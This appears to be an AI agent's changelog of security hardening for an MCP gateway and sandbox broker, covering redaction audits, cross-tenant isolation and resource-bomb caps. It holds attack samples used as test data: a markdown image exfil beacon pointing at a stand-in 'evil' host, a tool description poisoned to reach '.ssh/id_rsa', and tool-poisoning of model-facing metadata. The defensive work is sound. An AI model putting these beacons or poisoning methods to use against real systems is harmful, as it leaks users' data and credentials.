- **VERIFY:** `cd gateway && ./.venv/bin/python -m pytest ai_mesh_gateway/tests/test_mcp_internal_discover_tools_scan.py -q` → 5 passed (direct desc secret+PII+IP masked + redact audited; sandbox desc masked + audited; poisoned/unmaskable → withheld+block; error-envelope secret masked; benign preserved). Full sweep `ai_mesh_gateway/tests` → 1668 passed, 0 failed; broker `-k "not websocket"` → 120 passed (unaffected). **Byte-level:** description `Contact bob.jones@corp.example key AKIAIOSFODNN7EXAMPLE host 10.9.8.7` → `Contact b***@c***.example key AKIA****MPLE host [INTERNAL_IPV4_REDACTED]`; poisoned `…/.ssh/id_rsa` desc → `tools/list withheld`. **Independent oracle (aidefence):** `has_pii` **true** on the raw tools/list description, **false** on the masked. Evidence: `mcp-parallel/findings/backstop-p-internal-discover-tools-unscanned/finding.md`.

### CHG-0109 — INBOUND arg redaction was not audited on the internal / bare-REST / ext paths (tag-inputs→audit gap)
- **Date:** 2026-07-03
- **Scratchpad item:** G2 item 3 / 1.4 "compliance tagging — tag INPUTS + results, enforce by tag, AUDIT" + the per-call chain …→scan+redact→tag→AUDIT.
- **Severity:** LOW–MEDIUM (audit-completeness / compliance-visibility gap — NOT a leak: the egress bytes were already correctly redacted; the REDACTION was invisible to the audit/SIEM trail).
...
- **WHAT (gap):** when a tool call's ARGUMENTS carry PII/IP that the gateway MASKS (server `scan_action="redact"`, not a hard block) before forwarding, the main `org_mcp_jsonrpc` path folds that into its per-call `_was_redacted` audit event (`decision="redact"`). But the internal (`internal_tools_call`), bare-REST (`org_mcp_tool_call`), and external-proxy (`ext_mcp_proxy`) paths swapped the masked args in SILENTLY — `if scanned_args is not arguments: arguments = scanned_args` with NO `_record_gateway_event`. So an INPUT redaction (a user's PII masked before it egressed to the MCP server) was INVISIBLE to the audit/SIEM trail, asymmetric with the block branch (`pii_blocked_inbound`, already audited on all paths) and with the result-side redact audits (CHG-0081 REST / CHG-0106 internal). Byte-proven reachable: a `default_scan_action="redact"` server masked `bob.jones@corp.example` → `b***@c***.example` in the forwarded args, and ZERO gateway events were recorded.
- **WHY:** HARDEN 1.4 compliance tagging "tag INPUTS … audit" + the per-call chain's AUDIT step; three of four tool-call paths dropped the inbound-redact audit.
- **NOW DOES:** each of the three paths records `decision="redact", reason="pii_redacted_inbound"` (with the inbound compliance_tags + findings + meta) when `scanned_args` differs from the raw args and the call was not blocked — parity with the block branch and the main-path per-call event. Benign args (no redaction) record nothing (findings-only audit paths, no noise); a credential still force-BLOCKS (records `pii_blocked_inbound`, never a redact). NOTE: the ext-proxy edit is defense-in-depth parity — that path scans args with `enabled_info=None` → `"tag"` → no inbound redaction occurs under current config, so its branch is not config-reachable today.
- **Touched whose work:** the owning-session proxy's three non-main tool-call inbound paths; inbound twin of CHG-0081 (REST result redact audit) / CHG-0106 (internal result redact audit).
- **VERIFY:** `cd gateway && ./.venv/bin/python -m pytest ai_mesh_gateway/tests/test_mcp_inbound_redact_audit.py -q` → 5 passed (internal end-to-end: email actually masked in the forwarded args AND `('redact','pii_redacted_inbound')` recorded; internal benign → no audit; internal credential → block-not-redact; bare-REST end-to-end redact audited; bare-REST benign → no inbound-redact audit). Full sweep `ai_mesh_gateway/tests` → 1673 passed, 0 failed; broker `-k "not websocket"` → 120 passed (unaffected). **Byte-level / oracle:** forwarded masked args `{"note":"email b***@c***.example please"}` → aidefence `has_pii=false` (the redaction the audit now records; the raw args are `has_pii=true`). No raw-vs-fixed EGRESS delta — this is an audit-visibility fix, the egress was already redacted. Evidence: `mcp-parallel/findings/backstop-p-inbound-redact-audit/finding.md`.

### CHG-0110 — ext-proxy egress leaked client IP / internal topology / org slug to third-party servers (least-privilege / context-minimization)
- **Date:** 2026-07-03
- **Scratchpad item:** HARDEN 1.4 "context minimization / least-privilege" (egress header minimization).
...
- **WHAT (gap):** `_ext_proxy_forward_headers` (the least-privilege outbound header set for the transparent EXTERNAL proxy) is a DENYLIST — it stripped credentials (`authorization`/`cookie`/`x-api-key`, CHG-0033) + `x-gateway-*` + hop-by-hop, but forwarded EVERYTHING else to the untrusted third-party server. So request-ROUTING / client-IDENTITY / topology headers leaked: `x-forwarded-for` / `x-real-ip` (the caller's real public IP + an internal IP), `x-forwarded-host` / `forwarded` / `via` (internal gateway host + proxy chain), and `referer` (the internal URL **and the org/tenant slug**, e.g. `https://gw.internal/org/demo/chat`). Byte-verified pre-fix: all six egressed to the third party, disclosing `203.0.113.9` + `10.0.0.2` + `gw.internal` + `org/demo`.
- **WHY:** HARDEN 1.4 context-minimization / least-privilege — a denylist forwards-by-default; an MCP server needs none of the caller's IP / internal topology / tenant identity.
- **NOW DOES:** `_ext_proxy_forward_headers` also drops `_EXT_ROUTING_HEADERS` (`x-real-ip`, `forwarded`, `via`, `referer`, `referrer`) and any `x-forwarded-*` header (prefix). A third-party external MCP server now sees only protocol/benign headers (content-type, accept, `mcp-session-id`, `mcp-protocol-version`, user-agent) + the gateway's OWN injected upstream OAuth — NEITHER the caller's IP, NOR the internal topology, NOR the org/tenant slug. Credential-stripping (CHG-0033) unchanged.
- **Touched whose work:** the owning-session proxy `_ext_proxy_forward_headers` (extends the CHG-0033 least-privilege header set).
- **VERIFY:** `cd gateway && ./.venv/bin/python -m pytest ai_mesh_gateway/tests/test_mcp_bare_proxy_scan.py -q -k forward_headers` → 3 passed (new `test_ext_proxy_forward_headers_strips_client_ip_and_topology`: all x-forwarded-*/x-real-ip/forwarded/via/referer stripped; values `203.0.113.9`/`10.0.0.2`/`gw.internal`/`org/demo` absent; protocol headers + user-agent preserved). Full sweep `ai_mesh_gateway/tests` → 1682 passed, 0 failed; broker `-k "not websocket"` → 120 passed (unaffected). **Byte-level (authoritative here):** the forwarded header set is exactly `{content-type, accept, mcp-session-id, mcp-protocol-version, user-agent, Authorization=upstream-oauth}`. **Oracle note:** aidefence is blind to the IP/topology/identity-header class (`piiFound=false` on the raw blob), so the byte-level header-absence assertion is authoritative (no detection-regex dependency). Evidence: `mcp-parallel/findings/backstop-p-ext-egress-header-minimization/finding.md`.

### CHG-0111 — broker org_slug sanitize-collision → cross-tenant sandbox sharing (fail-closed slug validation)
- **Date:** 2026-07-03
- **Scratchpad item:** cross-tenant isolation / broker input validation (G3 item 9 auth/validation + G5 item 19 cross-tenant canaries — the CODE root-cause of a collision the live canaries would catch).
- **Severity:** HIGH (cross-tenant isolation break — two distinct orgs could execute in / destroy the SAME sandbox container).
...
- **WHAT (gap):** the broker key (`X-MCP-Broker-Key`) is a SHARED secret (not per-org), so the path `org_slug` is the SOLE tenant selector for sandbox routing. `DockerManager` LOSSILY sanitizes it for the container/volume/network name — `re.sub(r"[^a-zA-Z0-9_.-]", "-", slug).strip("-") or "default"` — and `find_container` matches by that name FIRST (`get_container_by_name`) before the exact-label filter. NO route validated the slug. So two DISTINCT slugs COLLIDE onto ONE container: `acme/prod` ≡ `acme-prod`; `acme prod` ≡ `acme-prod`; `-acme` ≡ `acme-` ≡ `acme`; `teñant` ≡ `te-ant`; and any empty / all-invalid slug (`""`, `///`, `!!!`) → `default`. A colliding slug on `/rpc` executes org B's tool call in org A's sandbox; on `DELETE /{org_slug}` destroys the wrong org's container; on `/status` leaks another org's process list — a cross-tenant isolation break at the very boundary the architecture relies on.
- **WHY:** the broker is the tenant ISOLATION boundary; it must NOT trust the caller to supply a collision-free slug (validate-input-at-boundaries). A lossy sanitize-and-route silently maps distinct tenants to one sandbox.
- **NOW DOES:** every `/{org_slug}/` route (`/ensure`, `/rpc`, `/stdio/rpc`, `/status`, `DELETE /{org_slug}`) calls `_require_canonical_org_slug` first, which FAILS CLOSED (HTTP 400) on any slug the sanitizer would alter — accepting ONLY a slug that maps 1:1 (`sanitize(slug) == slug`, non-empty, ≤64 chars, no leading/trailing `-`, chars ∈ `[a-zA-Z0-9_.-]`). Distinct tenants can no longer share a sandbox. (An encoded-SLASH slug is additionally rejected by FastAPI path routing (404) before the handler.) Canonical slugs (`acme`, `acme-prod`, `acme_corp`, `acme.dev`, `Acme123`) are unaffected.
- **Touched whose work:** the broker sandbox routes (`build_sandbox_router`); complements the CHG-0052 broker RPC logging + the per-org isolation the sandbox architecture (P4.13/P6.18) provides.
- **VERIFY:** `cd services/mcp-broker && ./.venv/bin/python -m pytest tests/test_sandbox_org_slug_validation.py -q` → 26 passed (validator rejects the 12 collision/oversize/empty vectors, accepts 8 canonical; each of `/rpc` `/ensure` `/status` `DELETE` returns 400 on a colliding slug; a canonical slug still routes → 503 mock-docker, not 400). Full broker `tests -k "not websocket"` → 146 passed. **Byte-level:** `container_name("acme/prod") == container_name("acme-prod")` (both `…-acme-prod`) pre-fix → now `_require_canonical_org_slug("acme/prod")` raises 400 while `"acme-prod"` passes. Gateway unaffected (no gateway files; the gateway posts to the broker over HTTP, supplies validated org slugs). **Oracle:** N/A — cross-tenant ROUTING/isolation fix, no PII-text egress delta; the collision demonstration + route-level 400s are authoritative. Evidence: `mcp-parallel/findings/backstop-p-broker-org-slug-collision/finding.md`.

### CHG-0112 — broker by-name container lookup didn't verify the org label (cross-tenant residual; completes CHG-0111)
- **Date:** 2026-07-03
- **Scratchpad item:** cross-tenant isolation / broker (defense-in-depth completion of CHG-0111).
- **Severity:** MEDIUM–HIGH (cross-tenant residual — a name-matched-but-mislabeled container could serve the wrong org, esp. during the CHG-0111 transition while pre-fix collided containers still run).
- **Files:** `services/mcp-broker/src/sandbox/docker_manager.py` (`get_container_by_name` + new `_container_labels` helper; `list_sandbox_containers` deduped onto it); `services/mcp-broker/tests/test_sandbox_lifecycle.py` (+4 tests, mock now carries labels); `services/mcp-broker/tests/test_sandbox_routes.py` (mock now carries labels).
- **WHAT (gap):** `find_container(org_slug)` calls `get_container_by_name` FIRST, which did a pure `client.containers.get(container_name(org_slug))` and returned the result with NO label check. The container NAME comes from a LOSSY sanitizer, so a name match is NOT proof of tenancy: a legacy/renamed/reused container that owns the name but carries a DIFFERENT `LABEL_ORG_SLUG` would be returned for the WRONG org. CHG-0111 stops NEW colliding slugs at the route, but a container CREATED before CHG-0111 for a colliding slug (e.g. `acme/prod` still owning `…-acme-prod`) would still be matched by name for the canonical org `acme-prod` — a cross-tenant residual the input validation alone can't cover (the mislabeled container already exists).
- **WHY:** the org LABEL is the authoritative tenant key; matching by a lossy-derived NAME without verifying the label is fragile — the broker is the isolation boundary and must fail closed on a name/label mismatch.
- **NOW DOES:** `get_container_by_name` reads the container's labels (`_container_labels`, robust to SDK `.labels` vs raw `attrs.Config.Labels`) and returns the container ONLY if `LABEL_ORG_SLUG == org_slug` AND `LABEL_ROLE == "mcp-sandbox"`; on any mismatch it logs a warning and returns None (fail closed), so `find_container` falls through to the authoritative label-filtered `containers.list` lookup. The org LABEL is now the tenant key; the deterministic name is only an optimization.
- **Touched whose work:** broker `DockerManager` container resolution; completes CHG-0111 (input validation + label verification = belt-and-suspenders cross-tenant isolation). The two test mocks were made realistic (real sandbox containers always carry these labels, set by `ensure`).
- **VERIFY:** `cd services/mcp-broker && ./.venv/bin/python -m pytest tests/test_sandbox_lifecycle.py -q -k "by_name or foreign_label or org_label or name_match"` → 4 passed (matching label → returned; mismatched org label → None; missing/wrong role → None; `find_container` ignores a foreign-labeled name-match and uses the label filter → correct container). Full broker `tests -k "not websocket"` → 150 passed (was 146 + 4). Gateway unaffected (broker-only). **Oracle:** N/A — cross-tenant ROUTING/isolation fix, no PII-text egress delta (the label-mismatch → None behavior is authoritative). Evidence: `mcp-parallel/findings/backstop-p-broker-name-label-verify/finding.md`.

### CHG-0113 — broker destroy removed the org VOLUME by name without label verification (cross-tenant residual; completes CHG-0112 for volumes)
- **Date:** 2026-07-03
- **Scratchpad item:** cross-tenant isolation / broker (defense-in-depth completion of CHG-0111/0112 across the volume resource).
- **Severity:** LOW–MEDIUM (cross-tenant DATA DESTRUCTION residual — `destroy` could remove another org's auth volume via a colliding/legacy name; narrow transition-window since CHG-0111 stops new collisions).
...
- **WHAT (gap):** CHG-0112 made the org LABEL the authoritative tenant key for the CONTAINER (`find_container`), but `destroy` still removed the org's auth VOLUME (`/data/mcp-auth`) purely by its `volume_name(org_slug)` — a LOSSY-sanitized name — with NO label check (`client.volumes.get(name).remove()`). The volume was auto-created (unlabeled) by the container run, so it had no label to verify. A legacy/reused volume owning the canonical name but belonging to a DIFFERENT org (e.g. a pre-CHG-0111 volume for a colliding slug) would be DESTROYED for the wrong org — the volume-resource twin of the CHG-0112 container residual. Networks/volumes were never labeled, so the fix first had to make the volume verifiable.
- **WHY:** the broker is the tenant isolation boundary; every per-org resource `destroy` touches (container AND volume) must key off the authoritative org LABEL, not a lossy-derived name — parity with CHG-0112.
- **NOW DOES:** (1) `_ensure_volume` explicitly creates the org's volume WITH `labels(org_slug)` before the container run (idempotent + best-effort — a pre-existing volume is left as-is; failure never blocks provisioning since the run auto-creates by name anyway), so NEW volumes carry the org label. (2) `destroy` reads the volume's labels (`_volume_labels`) and REFUSES to remove a volume whose `LABEL_ORG_SLUG` is present AND differs from the requested org (logs + skips, fail-closed); an unlabeled legacy volume (name authoritative for canonical slugs post-CHG-0111) or a same-org volume is still removed. The org LABEL is now the tenant key for the volume too.
- **Touched whose work:** broker `DockerManager` volume lifecycle; completes CHG-0111 (slug validation) + CHG-0112 (container label verification) across the volume resource.
- **VERIFY:** `cd services/mcp-broker && ./.venv/bin/python -m pytest tests/test_sandbox_lifecycle.py -q -k volume` → 8 passed (`_ensure_volume` creates a labeled volume when missing; idempotent when present; `destroy` removes an unlabeled legacy volume; removes a same-org volume; REFUSES a foreign-labeled volume → `remove` not called). Full broker `tests -k "not websocket"` → 155 passed (was 150 + 5). Gateway unaffected (broker-only). **Oracle:** N/A — cross-tenant ROUTING/isolation fix, no PII-text egress delta (the foreign-label → skip behavior is authoritative). Evidence: `mcp-parallel/findings/backstop-p-broker-volume-label-verify/finding.md`.

**Cross-tenant surface AUDIT (this iteration, verification-only — no code change):** before landing CHG-0113 I adversarially re-probed the other tenant-selector surfaces and found them ALREADY hardened — recorded so future sessions don't re-drill: (a) gateway OAuth token store `mcp_oauth_proxy.py` — Redis key `mcp:oauth:token:{org_slug}|{server_url}` is org-prefixed by a clean Django slug (delimiter collision needs `|` in org_slug → not reachable); flow/callback/status all `_require_org_scope`-gated, one-time signed `state`, PKCE, token bound from the trusted flow record (not callback params), status returns no token material, callback XSS-escaped (B3). (b) control-plane `mcp_connector/views.py` — `_request_org` derives tenant from the authenticated profile (JWT) or a SECRET-validated (`secrets.compare_digest`) gateway-internal `X-Org-Slug` header — client-supplied org NOT honored, not spoofable; `MCPEvent` recording sanitizes ALL channels (`_sanitize_event_text` scalars + `_sanitize_event_structure` metadata/tags/findings), enforces tenant/observability invariants. (c) gateway tool-call cap `_incr_tool_call_count` is per-key (`key_hash`). **Flagged (not fixed — env-blocked + not reachable):** `_gateway_request_org` honors `X-Org-Slug` relying on the view's permission gate rather than self-verifying the internal secret — NOT reachable today (all callers are `IsAuthenticatedOrGatewayInternal`/`IsGatewayInternalOnly`) but a defense-in-depth self-verify would harden it against a future weaker-permission view. Deferred because the control-plane pytest env is unavailable here (no venv; `django`/`fakeredis` not importable) so the change could not be gated — parity with the host-blocked items.
...
- **Date:** 2026-07-03
- **Scratchpad item:** HARDEN 1.4 (render-leak/exfil defense) + resource-bomb containment (deep-nesting DoS). Corrects a latent bug in the backstop's own CHG-0097.
...
- **WHAT (gap):** `_neutralize_exfil_deep` (CHG-0097 — parses the WHOLE result JSON and neutralizes render-leaks per string leaf) recursed into nested lists/dicts via `_walk` with NO depth bound. CPython's `json.loads` C scanner PARSES very deeply-nested JSON (thousands deep) that the Python-level `_walk` then cannot traverse (default recursion limit ~1000) → `RecursionError`. The existing `try/except` covered only `json.loads`, NOT `_walk`/`json.dumps`, so the RecursionError propagated to tier1's exfil block, which swallowed it — SILENTLY SKIPPING render-leak neutralization for that result (a fail-OPEN of the CHG-0096–0099 exfil defense). Byte-verified: `_neutralize_exfil_deep(json.dumps(nested(6000)))` raised RecursionError; the result floor returned clean (exfil check bypassed).
- **WHY:** untrusted MCP result payloads must not be able to DoS or DISABLE the scan; a recursive walk over attacker-controlled JSON needs a depth bound + fail-safe.
- **NOW DOES:** `_walk` is DEPTH-BOUNDED (`_MAX_EXFIL_WALK_DEPTH=200`, env `MCP_EXFIL_WALK_MAX_DEPTH`) — beyond the cap the subtree is returned as-is (a render-time beacon nested this deep cannot reconstruct client-side, and the whole serialized text is still tier1-scanned); and the walk + re-serialize are wrapped in `try/except` → fall back to string-level `_neutralize_render_leaks(text)` on RecursionError / any error. So a deeply-nested result can no longer exhaust the stack NOR silently disable the exfil defense; realistic (shallow) beacons are still defanged.
- **Touched whose work:** the owning-session orchestrator `_neutralize_exfil_deep` (backstop CHG-0097). Self-correction.
- **VERIFY:** `cd gateway && ./.venv/bin/python -m pytest ai_mesh_gateway/tests/test_mcp_result_exfil_beacon_defang.py -q` → 33 passed (27 existing + 6 new: deep nest 2000/6000/20000 no RecursionError; shallow + depth-150 beacons still defanged; full floor survives an 8000-deep result). Full sweep `ai_mesh_gateway/tests` → 1699 passed, 0 failed. **Byte-level:** `_neutralize_exfil_deep(json.dumps(nested(20000)))` returns a str (no RecursionError); `{"a":{"b":{"c":"see ![x](https://evil…?d=<b64>)"}}}` → `see [x](https://evil…/[exfil-redacted])` (auto-render stripped). **Oracle:** N/A — a DoS + beacon-defang fix, not a PII-text leak (aidefence doesn't classify beacons/nesting); the no-RecursionError + beacon-absent byte assertions are authoritative. **RESIDUAL (documented):** a beacon nested PAST the 200 cap is not per-leaf-defanged — but such depth is not a realistic client auto-render vector, and closing the stack-exhaustion DoS is the priority. Evidence: `mcp-parallel/findings/backstop-p-exfil-deep-nest-dos/finding.md`.

### CHG-0115 — proactive nesting-depth cap on tool RESULTS (deep-nested resource bomb; robust + monitor-correct)
- **Date:** 2026-07-03
- **Scratchpad item:** resource-bomb containment (mem/fork/disk/timeout) — the deep-nesting DoS twin of CHG-0104 (block-count) / CHG-0114 (exfil-walk).
- **Severity:** LOW–MEDIUM (robustness + a monitor-semantics fix — the pre-existing fail-closed-on-RecursionError was SAFE for enforcement but crashed the observe-only "monitor" path into a wrongful block).
...
- **WHAT (gap):** a tool RESULT STRUCTURE nested thousands of levels deep makes the recursive scan/serialize hit Python's recursion limit (~1000) → `RecursionError`. `_scan_tool_result_floor`'s except already fail-CLOSED on that (so it never LEAKED), BUT (a) it relied on catching a fragile mid-scan RecursionError and only yielded a generic `SCAN_ERROR`, and (b) under a per-tool **`monitor`** action (observe-only, must NEVER block) the scan still ran, RecursionError'd, and the except fail-closed → a WRONGFUL block that violates the monitor contract. Byte-verified: a `{"structuredContent": nested(20000)}` result logged "maximum recursion depth exceeded (FAIL-CLOSED)".
- **WHY:** resource-bomb containment must be PROACTIVE and action-aware — never rely on catching a mid-scan stack overflow, and never let a DoS-guard break the observe-only contract.
- **NOW DOES:** a new O(depth-bounded), ITERATIVE `_exceeds_nesting_depth` (its own explicit stack — the guard can't itself be recursion-DoS'd) runs BEFORE the scan. Past `_MCP_MAX_RESULT_DEPTH` (500, env `MCP_MAX_RESULT_DEPTH` — ≫ any realistic result, ≪ the stack limit) it branches on the resolved action: under a real action → fail CLOSED with a clear `result_too_deeply_nested` + `RESOURCE_LIMIT`; under `monitor` → forward the result UNSCANNED (never block, meta `monitor_scan_skipped`). So a deep result can no longer crash the scan, gives a clear audit reason, and monitor stays observe-only. Sits alongside the CHG-0104 block-count cap.
- **Touched whose work:** the owning-session result floor `_scan_tool_result_floor` (extends CHG-0104; complements CHG-0114).
- **VERIFY:** `cd gateway && ./.venv/bin/python -m pytest ai_mesh_gateway/tests/test_mcp_result_block_count_cap.py -q` → 11 passed (7 existing + 4 new: `_exceeds_nesting_depth` iterative on a 50k-deep struct with NO RecursionError + no false-positive on wide-shallow; deep result → fail-closed with `result_too_deeply_nested`+RESOURCE_LIMIT; shallow result scans+masks normally; `monitor` deep result → NOT blocked/forwarded). Full sweep `ai_mesh_gateway/tests` → 1703 passed, 0 failed; broker unaffected (gateway-only). **Byte-level:** `_exceeds_nesting_depth(nested(50000), 500)` → True (no RecursionError in the guard); `{"structuredContent": nested(20000)}` under redact → blocked=True reason=result_too_deeply_nested; under monitor → blocked=False. **Oracle:** N/A — a DoS-containment/robustness fix, no PII-text leak delta. Evidence: `mcp-parallel/findings/backstop-p-result-depth-cap/finding.md`.

### CHG-0116 — proactive nesting-depth cap on inbound tool ARGS (input-side twin of CHG-0115)
- **Date:** 2026-07-03
- **Scratchpad item:** resource-bomb containment — input-side parity for the CHG-0115 result depth cap.
...
- **WHAT (gap):** CHG-0115 added the proactive depth cap to the RESULT floor, but the INPUT scanner `_scan_tool_args_block` (which scans attacker-controlled tool-call ARGUMENTS) had none. A deeply-nested args payload made the recursive input scan hit Python's recursion limit → `RecursionError`. `_scan_tool_args_block`'s except caught it and fail-CLOSED (so no raw egress), BUT (a) via a fragile mid-scan RecursionError with only a generic `arg_scan_error` reason, and (b) under a per-tool **`monitor`** action the crash fail-closed → a WRONGFUL block violating observe-only. Byte-verified: `{"payload": nested(20000)}` under monitor returned `blocked=True` (the monitor violation).
- **WHY:** the INPUT path is the primary attacker surface (client-supplied args); its resource-bomb containment must match the RESULT path (CHG-0104/0115) — proactive, iterative, action-aware.
- **NOW DOES:** `_scan_tool_args_block` runs the same iterative `_exceeds_nesting_depth` (from CHG-0115) BEFORE the scan; past `_MCP_MAX_ARG_DEPTH` (defaults to `_MCP_MAX_RESULT_DEPTH`=500, env `MCP_MAX_ARG_DEPTH`) it branches on the resolved action — real action → fail CLOSED with `args_too_deeply_nested` + `RESOURCE_LIMIT`; `monitor` → forward the args UNCHANGED (`monitor_scan_skipped`, never block). Deep args can no longer crash the scan, get a clear reason, and monitor stays observe-only. The credential force-block on shallow args is unchanged.
- **Touched whose work:** the owning-session inbound scanner `_scan_tool_args_block` (input-side twin of CHG-0115; parity with CHG-0104).
- **VERIFY:** `cd gateway && ./.venv/bin/python -m pytest ai_mesh_gateway/tests/test_mcp_result_block_count_cap.py -q` → 14 passed (11 + 3 new: deep args → fail-closed `args_too_deeply_nested`+RESOURCE_LIMIT; deep args under `monitor` → NOT blocked/forwarded; shallow args scan+mask normally). Full sweep `ai_mesh_gateway/tests` → 1706 passed, 0 failed; broker unaffected (gateway-only). **Byte-level:** `{"payload": nested(20000)}` under redact → blocked=True reason=args_too_deeply_nested; under monitor → blocked=False; `{"q":"email bob@corp.example"}` → masked, not blocked; credential in shallow args still force-blocks. **Oracle:** N/A — DoS-containment/robustness fix, no PII-text leak delta. Evidence: `mcp-parallel/findings/backstop-p-args-depth-cap/finding.md`.

### CHG-0117 — non-finite SSE stream had no TOTAL bound (infinite-stream resource bomb; connection/CPU DoS)
- **Date:** 2026-07-03
- **Scratchpad item:** resource-bomb containment (timeout/soak) — the streaming-path twin of the CHG-0104/0115/0116 caps.
...
- **WHAT (gap):** the ext-proxy NON-FINITE SSE `stream_gen` (CHG-0098 — server notifications / `*subscribe` / long-lived streams) caps each EVENT at `_MCP_SSE_EVENT_MAX_BYTES` (1MB) and never buffers the whole stream (memory-safe), but had NO TOTAL bound — no cap on total bytes, total events, or duration. An untrusted (compromised allowlisted) upstream can stream an INFINITE sequence of small (<1MB) events forever: the `async for chunk in resp.aiter_bytes()` loop runs indefinitely, holding the gateway connection, burning CPU scanning each event, and egressing unbounded data to the client. httpx's per-read timeout does NOT bound a slow-but-steady infinite stream. A resource/time bomb ("hours-long soak" / "timeout" in the stress mandate).
- **WHY:** untrusted-upstream streams must be TOTAL-bounded, not only per-event — a per-event cap alone lets an infinite feed of small events DoS the gateway.
- **NOW DOES:** `stream_gen` tracks `total_bytes` + `event_count` and, once either crosses `_MCP_SSE_STREAM_MAX_BYTES` (100MB, env `MCP_SSE_STREAM_MAX_BYTES`) or `_MCP_SSE_STREAM_MAX_EVENTS` (100000, env `MCP_SSE_STREAM_MAX_EVENTS`), CLOSES the stream fail-closed — yields a final `: [stream closed: resource limit]` comment, audits `sse_stream_limit_exceeded`, and returns (the `finally` still `aclose()`s the upstream resp + client). Generous defaults ≫ any realistic long-lived notification feed; env-tunable. A runaway/infinite stream is now contained; a normal stream is unaffected.
- **Touched whose work:** the owning-session `ext_mcp_proxy` non-finite SSE streaming path (extends CHG-0098; parity with the CHG-0104/0115/0116 caps).
- **VERIFY:** `cd gateway && ./.venv/bin/python -m pytest ai_mesh_gateway/tests/test_mcp_ext_sse_stream_scan.py -q` → 8 passed (5 existing + 3 new: stream closes after the total-EVENT cap with `sse_stream_limit_exceeded`; closes after the total-BYTE cap; an under-cap benign stream completes fully — all 5 events streamed). Full sweep `ai_mesh_gateway/tests` → 1709 passed, 0 failed; broker unaffected (gateway-only). **Byte-level:** 50 small events with `_MCP_SSE_STREAM_MAX_EVENTS=5` → output contains `stream closed: resource limit` and stops early; with the default caps a 5-event stream streams all 5 and never closes-on-limit. **Oracle:** N/A — a DoS-containment fix, no PII-text leak delta. Evidence: `mcp-parallel/findings/backstop-p-sse-stream-total-bound/finding.md`.

### CHG-0118 — ext-proxy forwarded completion/complete + resources/templates/list results UNSCANNED (metadata leak / tool-poisoning)
- **Date:** 2026-07-03
- **Scratchpad item:** HARDEN 1.4 — field-level redaction of tool RESULTS + tool-poisoning defense (extends the CHG-0077/0080 model-facing-metadata scan to the remaining finite methods).
...
- **WHAT (gap):** the transparent EXTERNAL proxy (`ext_mcp_proxy`) scans a result only when its method is in `_EXT_FINITE_RESULT_METHODS` (`_ext_scan_result` gate). Two finite, server-controlled, model/user-facing result methods were MISSING → forwarded RAW: (1) `completion/complete` → `result.completion.values[]` (the autocompletion strings the client shows to the user/model — a secret/PII/exfil-beacon in a suggested value leaked); (2) `resources/templates/list` → `result.resourceTemplates[].{name,description,uriTemplate}` (server metadata, model-facing exactly like `resources/list`, which IS scanned). Same leak/tool-poisoning class as tool descriptions (CHG-0077) and initialize instructions (CHG-0080). Byte-verified: a `completion.values` carrying `AKIAIOSFODNN7EXAMPLE` + `bob@corp.example` and a template `description` carrying `AKIA…` + `10.9.8.7` egressed raw pre-fix.
- **WHY:** HARDEN 1.4 — ALL finite server-controlled result content on the untrusted external path must be scanned; two spec methods were omitted from the scan set.
- **NOW DOES:** `completion/complete` and `resources/templates/list` are added to `_EXT_FINITE_RESULT_METHODS`, so their finite results are buffered + scanned via the same result floor (mask secret/PII/internal-IP, fail-closed block on unmaskable/encoded-exfil, render-leak neutralization, depth/block caps) as every other finite method — for both the JSON and SSE branches. A benign completion/template is preserved.
- **Touched whose work:** the owning-session `ext_mcp_proxy` finite-result scan set (extends CHG-0077 / CHG-0080).
- **VERIFY:** `cd gateway && ./.venv/bin/python -m pytest ai_mesh_gateway/tests/test_mcp_bare_proxy_scan.py -q -k "completion or templates_list or benign_completion"` → 3 passed (completion values secret+PII masked; template description secret+IP masked; benign completion preserved). Full ext-proxy file → 55 passed; full sweep `ai_mesh_gateway/tests` → 1713 passed, 0 failed; broker unaffected (gateway-only). **Byte-level:** `completion.values` `["key AKIAIOSFODNN7EXAMPLE","contact bob@corp.example"]` → `["key AKIA****MPLE","contact b***@c***.example"]`; template `description` `AKIA… host 10.9.8.7` → `AKIA****MPLE host [INTERNAL_IPV4_REDACTED]`. **Independent oracle (aidefence):** `has_pii` **true** on the raw completion result, **false** on the masked. Evidence: `mcp-parallel/findings/backstop-p-ext-completion-templates-scan/finding.md`.

### CHG-0119 — ext-proxy did not credential-scan completion/complete CLIENT INPUT before egress (input-side twin of CHG-0118)
- **Date:** 2026-07-03
- **Scratchpad item:** HARDEN 1.4 — context minimization / no credential egress to external servers (input-side parity for CHG-0118).
...
- **WHAT (gap):** CHG-0118 added `completion/complete` to the RESULT scan, but its CLIENT INPUT was still forwarded to the external server unscanned. The ext-proxy inbound credential-scan (`_EXT_ARG_SCAN_METHODS` = tools/call, prompts/get) only inspects `params.arguments`; `completion/complete`'s client input has a DIFFERENT shape — `params.argument.value` (the partial value the user is typing) + `params.context.arguments` (prior arg values) — so it was never scanned. A credential/secret in that input egressed to the untrusted (allowlisted) external server. Asymmetric: the completion RESULT was scanned (CHG-0118) but the completion INPUT was not.
- **WHY:** HARDEN 1.4 context-minimization — client input that egresses to a third-party server must be credential-scanned; `completion/complete`'s distinct param shape was missed by the `params.arguments`-only logic.
- **NOW DOES:** `ext_mcp_proxy` now extracts `completion/complete`'s `params.argument.value` + `params.context.arguments` into a synthetic input dict and runs it through `_scan_tool_args_block` (same E12 credential force-block + inbound-redact machinery as tools/call args) BEFORE egress: a credential is BLOCKED (JSON-RPC compliance error, never sent to the upstream — `client.send` not awaited) and audited (`credential_blocked_inbound`); an inbound redaction is written back into the request body + audited (`pii_redacted_inbound`). Benign completion input is forwarded unchanged. Input+output of `completion/complete` are now both scanned (parity with tools/call).
- **Touched whose work:** the owning-session `ext_mcp_proxy` inbound scan (input-side twin of CHG-0118; extends CHG-0041 arg-scan / CHG-0109 inbound-redact audit).
- **VERIFY:** `cd gateway && ./.venv/bin/python -m pytest ai_mesh_gateway/tests/test_mcp_bare_proxy_scan.py -q -k "completion or benign_completion"` → 4 passed (credential in `argument.value` → blocked + `client.send.assert_not_awaited()`; credential in `context.arguments` → blocked + not forwarded; benign completion → forwarded `client.send.assert_awaited()`). Full sweep `ai_mesh_gateway/tests` → 1720 passed, 0 failed; broker unaffected (gateway-only). **Byte-level:** a completion `argument.value` `"my key AKIAIOSFODNN7EXAMPLE"` → the request is blocked, `AKIAIOSFODNN7EXAMPLE` never reaches `client.send`. **Oracle:** N/A — aidefence is blind to the AWS-key class (documented), so the secret-not-egressed + send-not-awaited byte assertions are authoritative. Evidence: `mcp-parallel/findings/backstop-p-ext-completion-input-scan/finding.md`.

